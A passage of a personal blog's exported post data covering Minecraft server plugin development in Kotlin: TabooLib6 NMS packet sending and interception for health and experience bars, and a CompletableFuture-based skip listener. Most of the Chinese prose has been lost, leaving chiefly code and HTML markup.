punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>TabooLib</p>\n<p>TabooLib</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Room</p>\n<p>RetrofitRetrofit</p>\n<p></p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li>KotlinJDK8default</li>\n<li>ResultSet</li>\n<li>&#x2F;genericSuperClass&#x2F;Interfaces</li>\n<li>voidUnitreturnTypeVoid::class.java,Unit::class.javareturnType.name &#x3D;&#x3D; void</li>\n</ul>\n"},{"title":"TabooLib6//","date":"2021-09-28T01:20:43.000Z","author":"","hide":false,"summary":"TabooLib","_content":"\n## \n\nNMSAdyeshachAraspleTrMenu\n\n...\n\n1.171.16.5\n\n\n\n****\n\n## \n\n\n\n********\n\n\n\n:\n\n> \n>\n> 1. \n> 2. PacketPlayOutUpdateHealth\n> 3. \n\n\n\n> 1. \n>\n> 2. (10110)\n>\n> 3. \n\n### \n\nNMSnet.minecraft.server.<>\n\nPacketPlayOutUpdateHealth\n\nPacket(Play)(Out)(UpdateHealth)\n\nPlay:  HandShake, Status, Login, Play\n\nOut: Out/In -> OutIn\n\nUpdateHealth: \n\n\n\n[Protocol - wiki.vg](https://wiki.vg/Protocol#Interact_Entity)\n\n### \n\nabc\n\n\n\n[![image-20210928084148586](https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67)](https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67)\n\n[Protocol - wiki.vg](https://wiki.vg/Protocol#Interact_Entity)\n\n[![image-20210928084449744](https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67)](https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67)\n\nwiki a ->  b ->  c -> \n\n**wiki**PacketPlayOutExperiencewiki\n\n\n\nwikiwikiDataWatcherwikiNotesNMS\n\nTips: NMSBukkitAPICraftBukkitNMS\n\n### TabooLib6//\n\n#### \n\nTabooLibNMSNMS\n\n****\n\n```kotlin\ninterface NMS {\n    \n    /**\n     * \n     *\n     * @param p \n     */\n    fun updateFoodBar(p: Player)\n\n    companion object {\n        // \n        // <>Impl\n        val handle by lazy {\n            nmsProxy<NMS>()\n        }\n    }\n}\n```\n\n****\n\n```kotlin\nclass NMSImpl : NMS {\n    \n    // nms\n    override fun updateFoodBar(p: Player) {\n        val foodData = (p as CraftPlayer).handle.foodData\n        p.handle.playerConnection.sendPacket(PacketPlayOutUpdateHealth(p.scaledHealth, foodData.foodLevel, foodData.saturationLevel))\n    }\n    \n}\n```\n\n#### /\n\nTabooLib6\n\nOutPacketSendEventInPacketReceiveEvent\n\n\n\n```kotlin\n@SubscribeEvent\nfun e(e: PacketSendEvent) {\n\t// \n    if (e.packet.name == \"PacketPlayOutExperience\") {\n        val v = expTempValue[e.player.name]\n        // \n        val level = e.packet.read<Int>(\"c\")\n        // \n        e.packet.write(\"a\", v ?: 0.0f)\n        e.packet.write(\"c\", 0)\n        // \n        e.isCancelled = true\n    }\n}\n```","source":"_posts/taboolib6-packet-control.md","raw":"---\ntitle: TabooLib6//\ndate: 2021-9-28 09:20:43\nauthor: \nhide: false\nsummary: TabooLib\ncategories: \ntags:\n  - TabooLib\n  - Kotlin\n---\n\n## \n\nNMSAdyeshachAraspleTrMenu\n\n...\n\n1.171.16.5\n\n\n\n****\n\n## \n\n\n\n********\n\n\n\n:\n\n> \n>\n> 1. \n> 2. PacketPlayOutUpdateHealth\n> 3. \n\n\n\n> 1. \n>\n> 2. (10110)\n>\n> 3. \n\n### \n\nNMSnet.minecraft.server.<>\n\nPacketPlayOutUpdateHealth\n\nPacket(Play)(Out)(UpdateHealth)\n\nPlay:  HandShake, Status, Login, Play\n\nOut: Out/In -> OutIn\n\nUpdateHealth: \n\n\n\n[Protocol - wiki.vg](https://wiki.vg/Protocol#Interact_Entity)\n\n### \n\nabc\n\n\n\n[![image-20210928084148586](https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67)](https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67)\n\n[Protocol - wiki.vg](https://wiki.vg/Protocol#Interact_Entity)\n\n[![image-20210928084449744](https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67)](https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67)\n\nwiki a ->  b ->  c -> \n\n**wiki**PacketPlayOutExperiencewiki\n\n\n\nwikiwikiDataWatcherwikiNotesNMS\n\nTips: NMSBukkitAPICraftBukkitNMS\n\n### TabooLib6//\n\n#### \n\nTabooLibNMSNMS\n\n****\n\n```kotlin\ninterface NMS {\n    \n    /**\n     * \n     *\n     * @param p \n     */\n    fun updateFoodBar(p: Player)\n\n    companion object {\n        // \n        // <>Impl\n        val handle by lazy {\n            nmsProxy<NMS>()\n        }\n    }\n}\n```\n\n****\n\n```kotlin\nclass NMSImpl : NMS {\n    \n    // nms\n    override fun updateFoodBar(p: Player) {\n        val foodData = (p as CraftPlayer).handle.foodData\n        p.handle.playerConnection.sendPacket(PacketPlayOutUpdateHealth(p.scaledHealth, foodData.foodLevel, foodData.saturationLevel))\n    }\n    \n}\n```\n\n#### /\n\nTabooLib6\n\nOutPacketSendEventInPacketReceiveEvent\n\n\n\n```kotlin\n@SubscribeEvent\nfun e(e: PacketSendEvent) {\n\t// \n    if (e.packet.name == \"PacketPlayOutExperience\") {\n        val v = expTempValue[e.player.name]\n        // \n        val level = e.packet.read<Int>(\"c\")\n        // \n        e.packet.write(\"a\", v ?: 0.0f)\n        e.packet.write(\"c\", 0)\n        // \n        e.isCancelled = true\n    }\n}\n```","slug":"taboolib6-packet-control","published":1,"updated":"2021-11-13T16:16:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtw002ksfkl1hhcetty","content":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>NMSAdyeshachAraspleTrMenu</p>\n<p></p>\n<p>1.171.16.5</p>\n<p></p>\n<p><strong></strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p><strong></strong><strong></strong></p>\n<p></p>\n<p>:</p>\n<blockquote>\n<p></p>\n<ol>\n<li></li>\n<li>PacketPlayOutUpdateHealth</li>\n<li></li>\n</ol>\n</blockquote>\n<p></p>\n<blockquote>\n<p>1. </p>\n<p>2. (10110)</p>\n<p>3. </p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>NMSnet.minecraft.server.&lt;&gt;</p>\n<p>PacketPlayOutUpdateHealth</p>\n<p>Packet(Play)(Out)(UpdateHealth)</p>\n<p>Play:  HandShake, Status, Login, Play</p>\n<p>Out: Out/In -&gt; OutIn</p>\n<p>UpdateHealth: </p>\n<p></p>\n<p><a href=\"https://wiki.vg/Protocol#Interact_Entity\">Protocol - wiki.vg</a></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>abc</p>\n<p></p>\n<p><a href=\"https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67\"><img src=\"https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67\" alt=\"image-20210928084148586\"></a></p>\n<p><a href=\"https://wiki.vg/Protocol#Interact_Entity\">Protocol - wiki.vg</a></p>\n<p><a href=\"https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67\"><img src=\"https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67\" alt=\"image-20210928084449744\"></a></p>\n<p>wiki a -&gt;  b -&gt;  c -&gt; </p>\n<p><strong>wiki</strong>PacketPlayOutExperiencewiki</p>\n<p></p>\n<p>wikiwikiDataWatcherwikiNotesNMS</p>\n<p>Tips: NMSBukkitAPICraftBukkitNMS</p>\n<h3 id=\"TabooLib6-x2F--x2F-\"><a href=\"#TabooLib6-x2F--x2F-\" class=\"headerlink\" title=\"TabooLib6//\"></a>TabooLib6//</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>TabooLibNMSNMS</p>\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">interface</span> NMS <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token comment\">/**\n     * \n     *\n     * @param p \n     */</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">updateFoodBar</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">companion</span> <span class=\"token keyword\">object</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// </span>\n        <span class=\"token comment\">// &lt;&gt;Impl</span>\n        <span class=\"token keyword\">val</span> handle <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">{</span>\n            nmsProxy<span class=\"token operator\">&lt;</span>NMS<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> NMSImpl <span class=\"token operator\">:</span> NMS <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token comment\">// nms</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">updateFoodBar</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> foodData <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p <span class=\"token keyword\">as</span> CraftPlayer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>handle<span class=\"token punctuation\">.</span>foodData\n        p<span class=\"token punctuation\">.</span>handle<span class=\"token punctuation\">.</span>playerConnection<span class=\"token punctuation\">.</span><span class=\"token function\">sendPacket</span><span class=\"token punctuation\">(</span><span class=\"token function\">PacketPlayOutUpdateHealth</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>scaledHealth<span class=\"token punctuation\">,</span> foodData<span class=\"token punctuation\">.</span>foodLevel<span class=\"token punctuation\">,</span> foodData<span class=\"token punctuation\">.</span>saturationLevel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    \n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"-x2F-\"><a href=\"#-x2F-\" class=\"headerlink\" title=\"/\"></a>/</h4><p>TabooLib6</p>\n<p>OutPacketSendEventInPacketReceiveEvent</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@SubscribeEvent</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PacketSendEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token comment\">// </span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"PacketPlayOutExperience\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> v <span class=\"token operator\">=</span> expTempValue<span class=\"token punctuation\">[</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span>\n        <span class=\"token comment\">// </span>\n        <span class=\"token keyword\">val</span> level <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span>read<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// </span>\n        e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> v <span class=\"token operator\">?:</span> <span class=\"token number\">0.0f</span><span class=\"token punctuation\">)</span>\n        e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// </span>\n        e<span class=\"token punctuation\">.</span>isCancelled <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go","url":"https://blog.stellaris.wang/","title":""}]}},"excerpt":"","more":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>NMSAdyeshachAraspleTrMenu</p>\n<p></p>\n<p>1.171.16.5</p>\n<p></p>\n<p><strong></strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p><strong></strong><strong></strong></p>\n<p></p>\n<p>:</p>\n<blockquote>\n<p></p>\n<ol>\n<li></li>\n<li>PacketPlayOutUpdateHealth</li>\n<li></li>\n</ol>\n</blockquote>\n<p></p>\n<blockquote>\n<p>1. </p>\n<p>2. (10110)</p>\n<p>3. </p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>NMSnet.minecraft.server.&lt;&gt;</p>\n<p>PacketPlayOutUpdateHealth</p>\n<p>Packet(Play)(Out)(UpdateHealth)</p>\n<p>Play:  HandShake, Status, Login, Play</p>\n<p>Out: Out&#x2F;In -&gt; OutIn</p>\n<p>UpdateHealth: </p>\n<p></p>\n<p><a href=\"https://wiki.vg/Protocol#Interact_Entity\">Protocol - wiki.vg</a></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>abc</p>\n<p></p>\n<p><a href=\"https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67\"><img src=\"https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67\" alt=\"image-20210928084148586\"></a></p>\n<p><a href=\"https://wiki.vg/Protocol#Interact_Entity\">Protocol - wiki.vg</a></p>\n<p><a href=\"https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67\"><img src=\"https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67\" alt=\"image-20210928084449744\"></a></p>\n<p>wiki a -&gt;  b -&gt;  c -&gt; </p>\n<p><strong>wiki</strong>PacketPlayOutExperiencewiki</p>\n<p></p>\n<p>wikiwikiDataWatcherwikiNotesNMS</p>\n<p>Tips: NMSBukkitAPICraftBukkitNMS</p>\n<h3 id=\"TabooLib6-x2F--x2F-\"><a href=\"#TabooLib6-x2F--x2F-\" class=\"headerlink\" title=\"TabooLib6&#x2F;&#x2F;\"></a>TabooLib6&#x2F;&#x2F;</h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>TabooLibNMSNMS</p>\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">interface</span> NMS <span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token comment\">/**\n     * \n     *\n     * @param p \n     */</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">updateFoodBar</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">companion</span> <span class=\"token keyword\">object</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// </span>\n        <span class=\"token comment\">// &lt;>Impl</span>\n        <span class=\"token keyword\">val</span> handle <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">&#123;</span>\n            nmsProxy<span class=\"token operator\">&lt;</span>NMS<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong></strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> NMSImpl <span class=\"token operator\">:</span> NMS <span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token comment\">// nms</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">updateFoodBar</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> foodData <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p <span class=\"token keyword\">as</span> CraftPlayer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>handle<span class=\"token punctuation\">.</span>foodData\n        p<span class=\"token punctuation\">.</span>handle<span class=\"token punctuation\">.</span>playerConnection<span class=\"token punctuation\">.</span><span class=\"token function\">sendPacket</span><span class=\"token punctuation\">(</span><span class=\"token function\">PacketPlayOutUpdateHealth</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>scaledHealth<span class=\"token punctuation\">,</span> foodData<span class=\"token punctuation\">.</span>foodLevel<span class=\"token punctuation\">,</span> foodData<span class=\"token punctuation\">.</span>saturationLevel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"-x2F-\"><a href=\"#-x2F-\" class=\"headerlink\" title=\"&#x2F;\"></a>&#x2F;</h4><p>TabooLib6</p>\n<p>OutPacketSendEventInPacketReceiveEvent</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@SubscribeEvent</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PacketSendEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token comment\">// </span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"PacketPlayOutExperience\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> v <span class=\"token operator\">=</span> expTempValue<span class=\"token punctuation\">[</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span>\n        <span class=\"token comment\">// </span>\n        <span class=\"token keyword\">val</span> level <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span>read<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// </span>\n        e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> v <span class=\"token operator\">?:</span> <span class=\"token number\">0.0f</span><span class=\"token punctuation\">)</span>\n        e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// </span>\n        e<span class=\"token punctuation\">.</span>isCancelled <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"CompletableFuture","date":"2021-08-28T05:21:28.000Z","author":"","hide":false,"summary":"javaCompletableFuture","_content":"\n([ | IzzelAliz's Blog](https://izzel.io/2020/02/12/chat-with-future/))\n\n****\n\n## \n\n\n\n\n\n****\n\n```kotlin\nclass AskSkipOrNot(private val uuid: UUID,\n                   private val future: CompletableFuture<Boolean>) : Listener {\n\n    @EventHandler\n    fun e(e: PlayerInteractEvent) {\n        if (e.player.uniqueId != uuid) return\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"RIGHT\"\n            && e.action == Action.RIGHT_CLICK_AIR) {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"LEFT\"\n            && e.action == Action.LEFT_CLICK_AIR) {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n    }\n\n    @EventHandler\n    fun e(e: PlayerSwapHandItemsEvent) {\n        if (e.player.uniqueId != uuid) return\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"F\") {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n    }\n}\n```\n\n****\n\n```kotlin\n    // \n    fun toIconDisplayAnimation(player: Player, func: () -> Unit = { }) {\n        player.setMetadata(\"SacredAuth:icon-display\", FixedMetadataValue(SacredAuth.plugin, true))\n        val future = CompletableFuture<Boolean>()\n        val time = conf.getLong(\"auth.display.time\")\n        KetherShell.eval(conf.getString(\"auth.display.script.display\")!!) {\n            sender = player\n        }\n        // \n        fun end() {\n            player.removeMetadata(\"SacredAuth:icon-display\", SacredAuth.plugin)\n            KetherShell.eval(conf.getString(\"auth.display.script.after-display\")!!) {\n                sender = player\n            }\n        }\n        future.thenRun {\n            end()\n            func.invoke()\n        }\n        val listener = AskSkipOrNot(player.uniqueId, future)\n        Bukkit.getPluginManager().registerEvents(listener, SacredAuth.plugin)\n        Tasks.task(true) {\n            try {\n                future.get(time * 50L, TimeUnit.MILLISECONDS)\n            } catch (ignored: TimeoutException) {\n                // futurefuturecomplete\n                // future.complete(true)\n                end()\n                func.invoke()\n            }\n        }\n    }\n```\n\n","source":"_posts/try-completablefuture.md","raw":"---\ntitle: CompletableFuture\ndate: 2021-08-28 13:21:28\nauthor: \nhide: false\nsummary: javaCompletableFuture\ncategories: \ntags:\n  - Kotlin\n  - Java\n---\n\n([ | IzzelAliz's Blog](https://izzel.io/2020/02/12/chat-with-future/))\n\n****\n\n## \n\n\n\n\n\n****\n\n```kotlin\nclass AskSkipOrNot(private val uuid: UUID,\n                   private val future: CompletableFuture<Boolean>) : Listener {\n\n    @EventHandler\n    fun e(e: PlayerInteractEvent) {\n        if (e.player.uniqueId != uuid) return\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"RIGHT\"\n            && e.action == Action.RIGHT_CLICK_AIR) {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"LEFT\"\n            && e.action == Action.LEFT_CLICK_AIR) {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n    }\n\n    @EventHandler\n    fun e(e: PlayerSwapHandItemsEvent) {\n        if (e.player.uniqueId != uuid) return\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"F\") {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n    }\n}\n```\n\n****\n\n```kotlin\n    // \n    fun toIconDisplayAnimation(player: Player, func: () -> Unit = { }) {\n        player.setMetadata(\"SacredAuth:icon-display\", FixedMetadataValue(SacredAuth.plugin, true))\n        val future = CompletableFuture<Boolean>()\n        val time = conf.getLong(\"auth.display.time\")\n        KetherShell.eval(conf.getString(\"auth.display.script.display\")!!) {\n            sender = player\n        